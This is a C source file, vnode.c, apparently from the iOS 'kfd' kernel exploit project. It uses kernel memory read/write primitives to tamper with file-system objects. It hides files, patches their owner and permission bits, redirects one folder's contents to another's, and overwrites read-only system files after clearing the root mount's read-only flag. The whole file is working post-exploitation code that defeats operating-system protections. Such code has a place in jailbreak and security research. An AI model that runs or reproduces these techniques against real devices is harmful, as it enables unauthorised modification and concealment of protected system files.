//
//  vnode.c
//  kfd
//
//  Created by Seo Hyun-gyu on 2023/07/29.
//

#include "vnode.h"
#include "krw.h"
#include "proc.h"
#include "offsets.h"
#include <sys/fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <sys/mman.h>

uint64_t getVnodeAtPath(char* filename) {
    int file_index = open(filename, O_RDONLY);
    if (file_index == -1) return -1;
    
    uint64_t proc = getProc(getpid());

    uint64_t filedesc_pac = kread64(proc + off_p_pfd);
    uint64_t filedesc = filedesc_pac | 0xffffff8000000000;
    uint64_t openedfile = kread64(filedesc + (8 * file_index));
    uint64_t fileglob_pac = kread64(openedfile + off_fp_glob);
    uint64_t fileglob = fileglob_pac | 0xffffff8000000000;
    uint64_t vnode_pac = kread64(fileglob + off_fg_data);
    uint64_t vnode = vnode_pac | 0xffffff8000000000;
    
    printf("[i] %s vnode: 0x%llx\n", filename, vnode);
    close(file_index);
    
    return vnode;
}

uint64_t funVnodeHide(char* filename) {
    uint64_t vnode = getVnodeAtPath(filename);
    if(vnode == -1) {
        printf("[-] Unable to get vnode, path: %s", filename);
        return -1;
    }
    
    //vnode_ref, vnode_get
    uint32_t usecount = kread32(vnode + off_vnode_v_usecount);
    uint32_t iocount = kread32(vnode + off_vnode_v_iocount);
    printf("[i] vnode->usecount: %d, vnode->iocount: %d\n", usecount, iocount);
    kwrite32(vnode + off_vnode_v_usecount, usecount + 1);
    kwrite32(vnode + off_vnode_v_iocount, iocount + 1);
    
    //hide file
    uint32_t v_flags = kread32(vnode + off_vnode_v_flag);
    printf("[i] vnode->v_flags: 0x%x\n", v_flags);
    kwrite32(vnode + off_vnode_v_flag, (v_flags | VISSHADOW));

    //exist test (should not be exist
    printf("[i] %s access ret: %d\n", filename, access(filename, F_OK));
    
    //show file
//    v_flags = kread32(vnode + off_vnode_v_flag);
//    kwrite32(vnode + off_vnode_v_flag, (v_flags &= ~VISSHADOW));
    
    printf("[i] %s access ret: %d\n", filename, access(filename, F_OK));
    
    //restore vnode iocount, usecount
    usecount = kread32(vnode + off_vnode_v_usecount);
    iocount = kread32(vnode + off_vnode_v_iocount);
    if(usecount > 0)
        kwrite32(vnode + off_vnode_v_usecount, usecount - 1);
    if(iocount > 0)
        kwrite32(vnode + off_vnode_v_iocount, iocount - 1);

    return 0;
}

uint64_t funVnodeChown(char* filename, uid_t uid, gid_t gid) {

    uint64_t vnode = getVnodeAtPath(filename);
    if(vnode == -1) {
        printf("[-] Unable to get vnode, path: %s", filename);
        return -1;
    }
    
    uint64_t v_data = kread64(vnode + off_vnode_v_data);
    uint32_t v_uid = kread32(v_data + 0x80);
    uint32_t v_gid = kread32(v_data + 0x84);
    
    //vnode->v_data->uid
    printf("[i] Patching %s vnode->v_uid %d -> %d\n", filename, v_uid, uid);
    kwrite32(v_data+0x80, uid);
    //vnode->v_data->gid
    printf("[i] Patching %s vnode->v_gid %d -> %d\n", filename, v_gid, gid);
    kwrite32(v_data+0x84, gid);
    
    struct stat file_stat;
    if(stat(filename, &file_stat) == 0) {
        printf("[+] %s UID: %d\n", filename, file_stat.st_uid);
        printf("[+] %s GID: %d\n", filename, file_stat.st_gid);
    }
    
    return 0;
}

uint64_t funVnodeChmod(char* filename, mode_t mode) {
    uint64_t vnode = getVnodeAtPath(filename);
    if(vnode == -1) {
        printf("[-] Unable to get vnode, path: %s", filename);
        return -1;
    }
    
    uint64_t v_data = kread64(vnode + off_vnode_v_data);
    uint32_t v_mode = kread32(v_data + 0x88);
    
    printf("[i] Patching %s vnode->v_mode %o -> %o\n", filename, v_mode, mode);
    kwrite32(v_data+0x88, mode);
    
    struct stat file_stat;
    if(stat(filename, &file_stat) == 0) {
        printf("[+] %s mode: %o\n", filename, file_stat.st_mode);
    }
    
    return 0;
}

uint64_t findRootVnode(void) {
    uint64_t launchd_proc = getProc(1);
    
    uint64_t textvp_pac = kread64(launchd_proc + off_p_textvp);
    uint64_t textvp = textvp_pac | 0xffffff8000000000;
    printf("[i] launchd proc->textvp: 0x%llx\n", textvp);

    uint64_t textvp_nameptr = kread64(textvp + off_vnode_v_name);
    uint64_t textvp_name = kread64(textvp_nameptr);
    uint64_t devvp = kread64((kread64(textvp + off_vnode_v_mount) | 0xffffff8000000000) + off_mount_mnt_devvp);
    uint64_t nameptr = kread64(devvp + off_vnode_v_name);
    uint64_t name = kread64(nameptr);
    char* devName = &name;
    printf("[i] launchd proc->textvp->v_name: %s, v_mount->mnt_devvp->v_name: %s\n", &textvp_name, devName);
    
    uint64_t sbin_vnode = kread64(textvp + off_vnode_v_parent) | 0xffffff8000000000;
    textvp_nameptr = kread64(sbin_vnode + off_vnode_v_name);
    textvp_name = kread64(textvp_nameptr);
    devvp = kread64((kread64(textvp + off_vnode_v_mount) | 0xffffff8000000000) + off_mount_mnt_devvp);
    nameptr = kread64(devvp + off_vnode_v_name);
    name = kread64(nameptr);
    devName = &name;
    printf("[i] launchd proc->textvp->v_parent->v_name: %s, v_mount->mnt_devvp->v_name:%s\n", &textvp_name, devName);
    
    uint64_t root_vnode = kread64(sbin_vnode + off_vnode_v_parent) | 0xffffff8000000000;
    textvp_nameptr = kread64(root_vnode + off_vnode_v_name);
    textvp_name = kread64(textvp_nameptr);
    devvp = kread64((kread64(root_vnode + off_vnode_v_mount) | 0xffffff8000000000) + off_mount_mnt_devvp);
    nameptr = kread64(devvp + off_vnode_v_name);
    name = kread64(nameptr);
    devName = &name;
    printf("[i] launchd proc->textvp->v_parent->v_parent->v_name: %s, v_mount->mnt_devvp->v_name:%s\n", &textvp_name, devName);
    printf("[+] rootvnode: 0x%llx\n", root_vnode);
    
    return root_vnode;
}

uint64_t funVnodeRedirectFolder(char* to, char* from) {
    uint64_t to_vnode = getVnodeAtPath(to);
    if(to_vnode == -1) {
        printf("[-] Unable to get vnode, path: %s\n", to);
        return -1;
    }
    
    uint8_t to_v_references = kread8(to_vnode + off_vnode_v_references);
    uint32_t to_usecount = kread32(to_vnode + off_vnode_v_usecount);
    uint32_t to_v_kusecount = kread32(to_vnode + off_vnode_v_kusecount);
    
    uint64_t from_vnode = getVnodeAtPath(from);
    if(from_vnode == -1) {
        printf("[-] Unable to get vnode, path: %s\n", from);
        return -1;
    }
    
    //If mount point is different, return -1
    uint64_t to_devvp = kread64((kread64(to_vnode + off_vnode_v_mount) | 0xffffff8000000000) + off_mount_mnt_devvp);
    uint64_t from_devvp = kread64((kread64(from_vnode + off_vnode_v_mount) | 0xffffff8000000000) + off_mount_mnt_devvp);
    if(to_devvp != from_devvp) {
        printf("[-] mount points of folders are different!");
        return -1;
    }
    
    uint64_t from_v_data = kread64(from_vnode + off_vnode_v_data);
    
    kwrite32(to_vnode + off_vnode_v_usecount, to_usecount + 1);
    kwrite32(to_vnode + off_vnode_v_kusecount, to_v_kusecount + 1);
    kwrite8(to_vnode + off_vnode_v_references, to_v_references + 1);
    kwrite64(to_vnode + off_vnode_v_data, from_v_data);
    
    return 0;
}

uint64_t funVnodeOverwriteFile(char* to, char* from) {

    int to_file_index = open(to, O_RDONLY);
    if (to_file_index == -1) return -1;
    off_t to_file_size = lseek(to_file_index, 0, SEEK_END);
    
    int from_file_index = open(from, O_RDONLY);
    if (from_file_index == -1) return -1;
    off_t from_file_size = lseek(from_file_index, 0, SEEK_END);
    
    if(to_file_size < from_file_size) {
        close(from_file_index);
        close(to_file_index);
        printf("[-] File is too big to overwrite!");
        return -1;
    }
    
    uint64_t proc = getProc(getpid());
    
    //get vnode
    uint64_t filedesc_pac = kread64(proc + off_p_pfd);
    uint64_t filedesc = filedesc_pac | 0xffffff8000000000;
    uint64_t openedfile = kread64(filedesc + (8 * to_file_index));
    uint64_t fileglob_pac = kread64(openedfile + off_fp_glob);
    uint64_t fileglob = fileglob_pac | 0xffffff8000000000;
    uint64_t vnode_pac = kread64(fileglob + off_fg_data);
    uint64_t to_vnode = vnode_pac | 0xffffff8000000000;
    printf("[i] %s to_vnode: 0x%llx\n", to, to_vnode);
    
    uint64_t rootvnode_mount_pac = kread64(findRootVnode() + off_vnode_v_mount);
    uint64_t rootvnode_mount = rootvnode_mount_pac | 0xffffff8000000000;
    uint32_t rootvnode_mnt_flag = kread32(rootvnode_mount + off_mount_mnt_flag);
    
    kwrite32(rootvnode_mount + off_mount_mnt_flag, rootvnode_mnt_flag & ~MNT_RDONLY);
    kwrite32(fileglob + off_fg_flag, O_ACCMODE);
    
    uint32_t to_vnode_v_writecount =  kread32(to_vnode + off_vnode_v_writecount);
    printf("[i] %s Increasing to_vnode->v_writecount: %d\n", to, to_vnode_v_writecount);
    if(to_vnode_v_writecount <= 0) {
        kwrite32(to_vnode + off_vnode_v_writecount, to_vnode_v_writecount + 1);
        printf("[+] %s Increased to_vnode->v_writecount: %d\n", to, kread32(to_vnode + off_vnode_v_writecount));
    }
    

    char* from_mapped = mmap(NULL, from_file_size, PROT_READ, MAP_PRIVATE, from_file_index, 0);
    if (from_mapped == MAP_FAILED) {
        perror("[-] Failed mmap (from_mapped)");
        kwrite32(rootvnode_mount + off_mount_mnt_flag, rootvnode_mnt_flag);
        close(from_file_index);
        close(to_file_index);
        return -1;
    }
    
    char* to_mapped = mmap(NULL, to_file_size, PROT_READ | PROT_WRITE, MAP_SHARED, to_file_index, 0);
    if (to_mapped == MAP_FAILED) {
        perror("[-] Failed mmap (to_mapped)");
        kwrite32(rootvnode_mount + off_mount_mnt_flag, rootvnode_mnt_flag);
        close(from_file_index);
        close(to_file_index);
        return -1;
    }
    
    memcpy(to_mapped, from_mapped, from_file_size);
    
    munmap(from_mapped, from_file_size);
    munmap(to_mapped, to_file_size);
    
    kwrite32(fileglob + off_fg_flag, O_RDONLY);
    kwrite32(rootvnode_mount + off_mount_mnt_flag, rootvnode_mnt_flag);
    
    close(from_file_index);
    close(to_file_index);

    return 0;
}
